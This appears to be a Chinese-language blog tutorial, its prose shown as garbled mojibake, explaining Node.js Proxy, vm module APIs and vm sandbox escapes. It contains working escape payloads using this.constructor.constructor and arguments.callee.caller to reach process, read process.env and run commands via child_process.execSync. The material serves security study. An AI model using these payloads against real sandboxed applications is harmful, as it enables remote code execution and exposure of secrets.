<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;  </span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;1&quot;</span>)  </span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">a</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"><span class="comment">//æ‰“å°ï¼š 1 2 3 </span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;  </span><br><span class="line">  <span class="keyword">await</span> <span class="number">1</span>  </span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;1&quot;</span>)  </span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">a</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"><span class="comment">//æ‰“å°ï¼š 3 1 2</span></span><br></pre></td></tr></table></figure>

<h5 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h5><p>Proxy æ˜¯å¯¹è±¡çš„åŒ…è£…ï¼Œå°†ä»£ç†ä¸Šçš„æ“ä½œè½¬å‘åˆ°å¯¹è±¡ï¼Œå¹¶å¯ä»¥é€‰æ‹©æ•è·å…¶ä¸­çš„ä¸€äº›æ“ä½œï¼Œå¯ä»¥åŒ…è£…ä»»ä½•ç±»å‹çš„å¯¹è±¡ï¼ŒåŒ…æ‹¬ç±»å’Œå‡½æ•°ã€‚</p>
<p>è¯­æ³•ï¼š <code>let proxy = new Proxy(target, handle)</code></p>
<ul>
<li>target    è¦åŒ…è£…çš„å¯¹è±¡ï¼Œå¯ä»¥æ˜¯ä»»ä½•ä¸œè¥¿ï¼ŒåŒ…æ‹¬å‡½æ•°</li>
<li>handle    ä»£ç†é…ç½®ï¼šå¸¦æœ‰â€é’©å­â€çš„å¯¹è±¡  æ¯”å¦‚geté’©å­ç”¨äºè¯»å–targetå±æ€§ seté’©å­ç”¨äºå†™å…¥targetå±æ€§</li>
</ul>
<p>e.g.</p>
<p>åˆ›å»ºä¸€ä¸ªæ²¡æœ‰ä»»ä½•é’©å­çš„ä»£ç†</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> target = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> proxy = <span class="keyword">new</span> <span class="title class_">Proxy</span> (target,&#123;&#125;);  <span class="comment">//ç©ºçš„handlerå¯¹è±¡</span></span><br><span class="line">proxy.<span class="property">test</span> = <span class="number">5</span>; <span class="comment">//å†™å…¥proxyå¯¹è±¡</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(target.<span class="property">test</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(proxy.<span class="property">test</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> proxy) <span class="variable language_">console</span>.<span class="title function_">log</span>(key)</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bfeb5984/1.png" alt="img"></p>
<p>åœ¨æ²¡æœ‰é’©å­æƒ…å†µä¸‹ æ‰€ä»¥å¯¹proxyçš„æ“ä½œéƒ½ä¼šè½¬å‘ç»™target</p>
<ul>
<li>1.å†™å…¥æ“ä½œ proxy.test ä¼šå°†å€¼å†™å…¥ target</li>
<li>2.è¯»å–æ“ä½œ proxy.test ä¼šä»target è¿”å›å¯¹åº”çš„å€¼</li>
<li>3.è¿­ä»£proxy ä¼šä» target è¿”å›å¯¹åº”çš„å€¼2</li>
</ul>
<p>åœ¨æ²¡æœ‰ä»»ä½•é’©å­æƒ…å†µä¸‹ï¼Œproxyæ˜¯ä¸€ä¸ªtargetçš„é€æ˜åŒ…è£…</p>
<p>targetä¸‹çš„ä¸€äº›å†…éƒ¨æ–¹æ³• å›¾ç‰‡æ¥æºåŠå‚è€ƒï¼š <a href="https://juejin.cn/post/6844904090116292616">https://juejin.cn/post/6844904090116292616</a></p>
<p><img src="/posts/bfeb5984/2.png" alt="img"></p>
<h6 id="Geté’©å­"><a href="#Geté’©å­" class="headerlink" title="Geté’©å­"></a>Geté’©å­</h6><p>å‚è€ƒ <a href="https://juejin.cn/post/6844904090116292616">https://juejin.cn/post/6844904090116292616</a></p>
<p>åˆ©ç”¨proxy ä¸­çš„ Geté’©å­ ä¸»è¦ç”¨äºè¯»å–target å±æ€§ï¼Œå½“è¯»å–å±æ€§æ€§ä¼šè§¦å‘è¯¥æ–¹æ³•</p>
<p>get(target, property, receiver)</p>
<ul>
<li>target    ç›®æ ‡å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’ç»™ new proxy</li>
<li>property    ç›®æ ‡å±æ€§å</li>
<li>received    å¦‚æœç›®æ ‡å±æ€§æ˜¯ä¸€ä¸ªgetterè®¿é—®å™¨å±æ€§ï¼Œåˆ™ receivedå°±æ˜¯æœ¬æ¬¡è¯»å–å±æ€§æ‰€åœ¨çš„å¯¹è±¡ã€‚é€šå¸¸æ˜¯proxyå¯¹è±¡æœ¬èº«ï¼Œå¯ä»¥ä¸éœ€è¦è¯¥å‚æ•°</li>
</ul>
<p>ä½¿ç”¨getå®ç°å¯¹è±¡çš„é»˜è®¤å€¼</p>
<p>é€šå¸¸æƒ…å†µä¸‹åœ¨nodejsè·å–ä¸å­˜åœ¨çš„æ•°ç»„é¡¹æ˜¯å°†ä¼šå¾—åˆ° <code>undefined</code>ï¼Œè€Œæˆ‘ä»¬å°†å¸¸è§„æ•°ç»„åŒ…è£…åˆ°ä»£ç†ä¸­ï¼Œä»¥æ•è·è¯»å–æ“ä½œ åœ¨æ²¡æœ‰æ­¤ç±»å±æ€§çš„æƒ…å†µä¸‹è¿”å›ä¸º <code>0</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> nums = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">nums = <span class="keyword">new</span> <span class="title class_">Proxy</span>(nums, &#123;</span><br><span class="line">    <span class="title function_">get</span>(<span class="params">target,prop</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (prop <span class="keyword">in</span> target)&#123;</span><br><span class="line">            <span class="keyword">return</span> target[prop]</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nums[<span class="number">1</span>])</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nums[<span class="number">10</span>])    </span><br></pre></td></tr></table></figure>

<p><img src="/posts/bfeb5984/3.png" alt="img"></p>
<h5 id="prepareStackTrace-è‡ªå®šä¹‰å¼‚å¸¸"><a href="#prepareStackTrace-è‡ªå®šä¹‰å¼‚å¸¸" class="headerlink" title="prepareStackTrace  è‡ªå®šä¹‰å¼‚å¸¸"></a>prepareStackTrace  è‡ªå®šä¹‰å¼‚å¸¸</h5><p>[<a href="https://www.bookstack.cn/read/node-in-debugging/3.3ErrorStack.md#3.3.4%20Error.prepareStackTrace]">https://www.bookstack.cn/read/node-in-debugging/3.3ErrorStack.md#3.3.4%20Error.prepareStackTrace]</a>(<a href="https://www.bookstack.cn/read/node-in-debugging/3.3ErrorStack.md#3.3.4">https://www.bookstack.cn/read/node-in-debugging/3.3ErrorStack.md#3.3.4</a> Error.prepareStackTrace)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error.prepareStackTrace(error, structuredStackTrace)</span><br></pre></td></tr></table></figure>

<ul>
<li>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ errorå¯¹è±¡</li>
<li>ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„</li>
</ul>
<p>Error.prepareStackTrace = function (error, callSites){ }</p>
<h4 id="node-jsä¸‹æ¼æ´åˆ©ç”¨"><a href="#node-jsä¸‹æ¼æ´åˆ©ç”¨" class="headerlink" title="node.jsä¸‹æ¼æ´åˆ©ç”¨"></a>node.jsä¸‹æ¼æ´åˆ©ç”¨</h4><h4 id="child-process"><a href="#child-process" class="headerlink" title="child_process"></a>child_process</h4><p>node.jså¯ä»¥åˆ©ç”¨child_processæ¨¡å—åˆ›å»ºå­è¿›ç¨‹æ‰§è¡Œä¸€äº›å‘½ä»¤ </p>
<p>åå¼¹shell</p>
<h3 id="VM-API"><a href="#VM-API" class="headerlink" title="VM API"></a>VM API</h3><p>ä»¥æ–‡æ¡£ä¸­çš„å®ä¾‹ä¸ºä¾‹  vmè¿è¡Œæ²™ç®±çš„è¿‡ç¨‹ï¼š</p>
<p>ç¼–è¯‘ä¸€æ®µä»£ç  -&gt; åˆ›å»ºä¸€ä¸ªä¸Šä¸‹æ–‡éš”ç¦»å¯¹è±¡ -&gt; åœ¨æ²™ç®±ä¸­è¿è¡Œä»£ç å¹¶è¿”å›ç»“æœ </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> context = &#123;</span><br><span class="line">  <span class="attr">animal</span>: <span class="string">&#x27;cat&#x27;</span>,</span><br><span class="line">  <span class="attr">count</span>: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(<span class="string">&#x27;count += 1; name = &quot;kitty&quot;;&#x27;</span>); <span class="comment">//ç¼–è¯‘code</span></span><br><span class="line"></span><br><span class="line">vm.<span class="title function_">createContext</span>(context); <span class="comment">// åˆ›å»ºä¸€ä¸ªä¸Šä¸‹æ–‡éš”ç¦»å¯¹è±¡</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">  script.<span class="title function_">runInContext</span>(context); <span class="comment">// åœ¨æŒ‡å®šçš„ä¸‹æ–‡é‡Œæ‰§è¡Œcodeå¹¶è¿”å›å…¶ç»“æœ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(context);</span><br><span class="line"><span class="comment">// æ‰“å°: &#123; animal: &#x27;cat&#x27;, count: 12, name: &#x27;kitty&#x27; &#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>vm.createContext([sandbox])</strong></li>
</ul>
<p>åœ¨ä½¿ç”¨å‰éœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªæ²™ç®±å¯¹è±¡ï¼Œåœ¨å°†æ²™ç®±å¯¹è±¡ä¼ ç»™è¯¥æ–¹æ³•ã€Œå¦‚æœæ²¡æœ‰åˆ™ä¼šç”Ÿæˆä¸€ä¸ªç©ºçš„æ²™ç®±å¯¹è±¡ã€v8ä¸ºè¿™ä¸ªæ²™ç®±å¯¹è±¡åœ¨*<strong>å½“å‰çš„globalå¤–å†åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸ*<strong>ï¼Œæ­¤æ—¶è¿™ä¸ªæ²™ç®±å¯¹è±¡å°±æ˜¯è¿™ä¸ªä½œç”¨åŸŸä¸­çš„å…¨å±€å¯¹è±¡ï¼Œ</strong>æ²™ç®±å†…éƒ¨æ— æ³•è®¿é—®globalä¸­çš„å±æ€§</strong>ã€‚</p>
<ul>
<li><strong>vm.runInThisContext(code)</strong> </li>
</ul>
<p>åœ¨å½“å‰globalä¸‹åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸ(sandbox) å¹¶å°†æ¥æ”¶åˆ°çš„å‚æ•°å½“åšä»£ç è¿è¡Œã€‚åœ¨sandboxä¸­å¯ä»¥è®¿é—®åˆ°globalä¸­çš„å±æ€§ï¼Œä½†æ— æ³•è®¿é—®å…¶ä»–åŒ…çš„å±æ€§</p>
<ul>
<li><strong>vm.runInNewContext(code[,sandbox][,options])</strong> </li>
</ul>
<p>createContextå’ŒrunInThisContextçš„ç»“åˆç‰ˆ  å‚æ•°ä¸ºä¼ å…¥è¦æ‰§è¡Œçš„ä»£ç å’Œæ²™ç®±å¯¹è±¡</p>
<ul>
<li><strong>vm.Scriptç±»</strong></li>
</ul>
<p>vm.Scriptç±»å‹çš„å®åŠ›åŒ…å«è‹¥å¹²é¢„ç¼–è¯‘çš„è„šæœ¬ï¼Œè¿™äº›è„šæœ¬èƒ½å¤Ÿåœ¨ç‰¹å®šçš„æ²™ç®±æˆ–è€…ä¸Šä¸‹æ–‡ä¸­è¢«è¿è¡Œ</p>
<ul>
<li><strong>new vm.Script(code, options)</strong> </li>
</ul>
<p>åˆ›å»ºä¸€ä¸ªæ–°çš„vm.Scriptå¯¹è±¡  åªç¼–è¯‘ä»£ç ä½†ä¸ä¼šæ‰§è¡Œã€‚  ç¼–è¯‘è¿‡çš„vm.Scriptä¹‹åå¯ä»¥å¤šæ¬¡è¢«æ‰§è¡Œ    codeå‚æ•°åªç»‘å®šäºæ¯æ¬¡æ‰§è¡Œå®ƒçš„å¯¹è±¡</p>
<ul>
<li>æ³¨ï¼š å¯¹äºä¸€äº›codeå‚æ•°çš„ä»£ç  ä¸€èˆ¬éƒ½ä½¿ç”¨ ````åå¼•å·è¿›è¡ŒåŒ…è£¹</li>
<li>vmæ¨¡å—è¯¦ç»†å¯å‚è€ƒä»¥ä¸‹ï¼š</li>
<li><a href="https://nodejs.cn/api/vm.html">https://nodejs.cn/api/vm.html</a> </li>
<li><a href="https://www.mianshigee.com/note/detail/27897wlr">https://www.mianshigee.com/note/detail/27897wlr</a></li>
</ul>
<h3 id="VMæ²™ç®±é€ƒé€¸"><a href="#VMæ²™ç®±é€ƒé€¸" class="headerlink" title="VMæ²™ç®±é€ƒé€¸"></a>VMæ²™ç®±é€ƒé€¸</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*]Before Escape\n&#x27;</span>)</span><br><span class="line">vm.<span class="title function_">runInNewContext</span>(<span class="string">&#x27;this.constructor.constructor(&quot;return process&quot;)().exit()&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*]Over Escape\n Never Execute!&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>åœ¨ç¬¬ä¸‰è¡Œå¤„ vmè™šæ‹Ÿæœºç¯å¢ƒä¸­çš„ä»£ç é€ƒé€¸ è·å¾—äº†ä¸»çº¿ç¨‹çš„Processå˜é‡ å¹¶è°ƒç”¨process.exit() é€ æˆä¸»ç¨‹åºéæ­£å¸¸é€€å‡º</p>
<p><img src="/posts/bfeb5984/4.png" alt="img"></p>
<p>ä»¥ä¸Šä»£ç ä¸»è¦ä½¿ç”¨äº†<code>runInNewContext</code> å‡½æ•°(ç›¸å½“äºcreateContextå’ŒrunInThisContext) </p>
<p>å…¶ç­‰ä»·äºå¦‚ä¸‹ä»£ç </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*]Before Escape\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆå§‹åŒ–ä¸€ä¸ªæ²™ç®±å¯¹è±¡</span></span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(<span class="string">&#x27;this.constructor.constructor(&quot;return process&quot;)().exit()&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">script.<span class="title function_">runInContext</span>(context);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*]Over Escape\n Never Execute!&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bfeb5984/5.png" alt="img"></p>
<h3 id="VMä¸‹æ²™ç®±é€ƒé€¸çš„åˆ©ç”¨æ–¹å¼"><a href="#VMä¸‹æ²™ç®±é€ƒé€¸çš„åˆ©ç”¨æ–¹å¼" class="headerlink" title="VMä¸‹æ²™ç®±é€ƒé€¸çš„åˆ©ç”¨æ–¹å¼"></a>VMä¸‹æ²™ç®±é€ƒé€¸çš„åˆ©ç”¨æ–¹å¼</h3><p>ä¸€èˆ¬æ²™ç®±é€ƒé€¸åéƒ½ä¼šå»å°è¯•rceï¼Œè€Œåœ¨Nodeä¸­è¿›è¡ŒRCEå°±éœ€è¦process  </p>
<p>åœ¨è·å–åˆ°processå¯¹è±¡ä¹‹å å¯ä»¥é€šè¿‡requireå¯¼å…¥child_processï¼Œç„¶ååœ¨åˆ©ç”¨child_processæ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>ç”±äºprocessæŒ‚è½½åœ¨globalä¸Šï¼Œè€Œé€šè¿‡API CreateContextåˆ›å»ºçš„æ²™ç®±å¯¹è±¡åœ¨golbalå¤–ï¼Œæ— æ³•è®¿é—®åˆ°globalï¼Œæ‰€ä»¥æƒ³è¦å®ç°rceå°±éœ€è¦æƒ³åŠæ³•å°†globalä¸­çš„Processå¼•å…¥åˆ°æ²™ç®±ä¸­ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> y1 = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.constructor.constructor(&#x27;return process.env&#x27;)()`</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(y1);</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bfeb5984/6.png" alt="img"></p>
<p>åœ¨ä¸Šè¿°ä»£ç ä¸­ ä¸»è¦é€šè¿‡ <code>vm.runInNewContext</code>å®ç°é€ƒé€¸æ¥è¿”å›è¿›ç¨‹ä¸Šä¸‹æ–‡ç¯å¢ƒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vm.runInNewContext(`this.constructor.constructor(&#x27;return process.env&#x27;)()`)</span><br></pre></td></tr></table></figure>

<p>thisæŒ‡å‘çš„æ˜¯å½“å‰ä¼ é€’ç»™  <code>runInNewContext</code>çš„å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡ä¸å±äºæ²™ç®±ç¯å¢ƒä¸­ï¼Œ</p>
<p>æˆ‘ä»¬é€šè¿‡è·å–è¿™ä¸ªå¯¹è±¡è·å–å…¶æ„é€ å™¨ã€Œ<code>this.constructor</code>ã€ï¼Œå†è·å¾—ä¸€ä¸ªæ„é€ å™¨å¯¹è±¡çš„æ„é€ å™¨ã€Œ<code>this.constructor.constructor</code>ã€ ï¼Œ æœ€åè°ƒç”¨è¿™ä¸ªå‡½æ•°çš„æ„é€ å™¨ç”Ÿæˆçš„å‡½æ•°ï¼Œè¿”å›å€¼ä¸ºä¸€ä¸ªProcesså¯¹è±¡ã€‚</p>
<h4 id="åˆ©ç”¨toStringè§¦å‘"><a href="#åˆ©ç”¨toStringè§¦å‘" class="headerlink" title="åˆ©ç”¨toStringè§¦å‘"></a>åˆ©ç”¨toStringè§¦å‘</h4><h5 id="åˆ©ç”¨this-constructor-constructor"><a href="#åˆ©ç”¨this-constructor-constructor" class="headerlink" title="åˆ©ç”¨this.constructor.constructor"></a>åˆ©ç”¨this.constructor.constructor</h5><p>ä¸€èˆ¬è¿›è¡Œæ²™ç®±é€ƒé€¸åä¼šè¿›è¡Œrce  åœ¨nodeä¸­è¿›è¡Œrceéœ€è¦processå¯¹è±¡ï¼Œè·å–åˆ°processå¯¹è±¡åï¼Œå¯ä»¥é€šè¿‡requireå¯¼å…¥child_process  åœ¨åˆ©ç”¨child_process æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> y1 = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.toString.constructor(&#x27;return process&#x27;)()`</span>);</span><br><span class="line"><span class="keyword">const</span> res = y1.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br></pre></td></tr></table></figure>

<p>ç„¶åé€šè¿‡è¿”å›çš„Processå¯¹è±¡æ¥RCE</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vm.runInNewContext(`this.constructor.constructor(&#x27;return process.env&#x27;)()`).mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()</span><br></pre></td></tr></table></figure>

<p><a href="https://nodejs.cn/api-v16/child_process.html#child_processexecsynccommand-options">https://nodejs.cn/api-v16/child_process.html#child_processexecsynccommand-options</a></p>
<p><img src="/posts/bfeb5984/7.png" alt="img"></p>
<h4 id="åˆ©ç”¨arguments-callee-caller"><a href="#åˆ©ç”¨arguments-callee-caller" class="headerlink" title="åˆ©ç”¨arguments.callee.caller"></a>åˆ©ç”¨arguments.callee.caller</h4><p>å°†ä¸Šä¸‹æ–‡å¯¹è±¡çš„åŸå‹é“¾è®¾ç½®ä¸ºnulllï¼Œå¹¶ä¸”æ²¡æœ‰å…¶ä»–å¯å¼•ç”¨å¯¹è±¡æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸ªå‡½æ•°ä¸­å†…ç½®å¯¹è±¡çš„å±æ€§<code>arguments.callee.caller</code>ï¼Œå®ƒå¯ä»¥è¿”å›å‡½æ•°çš„è°ƒç”¨è€….</p>
<h5 id="arguments"><a href="#arguments" class="headerlink" title="arguments"></a>arguments</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//argumentsæ˜¯ä¸€ä¸ªObjectå¯¹è±¡</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">arguments</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">a</span>())</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">a</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>))</span><br><span class="line"><span class="comment">// [Arguments] &#123;&#125;</span></span><br><span class="line"><span class="comment">// [Arguments] &#123; &#x27;0&#x27;: 1, &#x27;1&#x27;: 2, &#x27;2&#x27;: 3 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//caller.callerä¸ºargumentså¯¹è±¡çš„ä¸€ä¸ªæˆå‘˜ï¼Œå®ƒçš„å€¼ä¸ºæ­£è¢«æ‰§è¡Œçš„Functionå¯¹è±¡</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ac</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">arguments</span>.<span class="property">callee</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">ac</span>())</span><br><span class="line"><span class="comment">// [Function: ac]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//arguments.callee.callerè°ƒç”¨å½“å‰å‡½æ•°çš„å¤–å±‚å‡½æ•°ï¼Œå¦‚æœæ˜¯å•å‡½æ•°æ— åµŒå¥—çš„è¯å°±æ˜¯null/anonymous</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">acc</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">acc</span>())</span><br><span class="line"><span class="comment">// [Function (anonymous)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">acc2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">tset</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">tset</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">acc2</span>())</span><br><span class="line"><span class="comment">// [Function: acc2]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">acc3</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">test2</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">test3</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">test3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">test2</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">acc3</span>())</span><br><span class="line"><span class="comment">// [Function: test2]</span></span><br></pre></td></tr></table></figure>

<h5 id="åˆ©ç”¨arguments-callee-callerç»•è¿‡"><a href="#åˆ©ç”¨arguments-callee-callerç»•è¿‡" class="headerlink" title="åˆ©ç”¨arguments.callee.callerç»•è¿‡"></a>åˆ©ç”¨arguments.callee.callerç»•è¿‡</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;&#125;	</span><br><span class="line"><span class="comment">//context = Object.create(null);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`(() =&gt; &#123;</span></span><br><span class="line"><span class="string">    const a = &#123;&#125;</span></span><br><span class="line"><span class="string">    a.toString = function()&#123;</span></span><br><span class="line"><span class="string">        const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">        const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">        return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return a </span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="keyword">const</span> context =<span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox); <span class="comment">//ä¸Šä¸‹æ–‡éš”ç¦»å¯¹è±¡</span></span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script,context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*]whoami: &#x27;</span>+ res)</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bfeb5984/8.png" alt="img"></p>
<h4 id="åˆ©ç”¨Proxyä»£ç†ç»•è¿‡"><a href="#åˆ©ç”¨Proxyä»£ç†ç»•è¿‡" class="headerlink" title="åˆ©ç”¨Proxyä»£ç†ç»•è¿‡"></a>åˆ©ç”¨Proxyä»£ç†ç»•è¿‡</h4><p>å¦‚æœæ²™ç®±å¤–æ²¡æœ‰æ‰§è¡Œå­—ç¬¦ä¸²ç›¸å…³æ“ä½œæ¥è§¦å‘toStringï¼Œä¸”ä¹Ÿæ— æ³•åˆ©ç”¨æ¶æ„é‡å†™çš„å‡½æ•°æ—¶ï¼Œå¯ä»¥ä½¿ç”¨proxyæ¥åŠ«æŒå±æ€§</p>
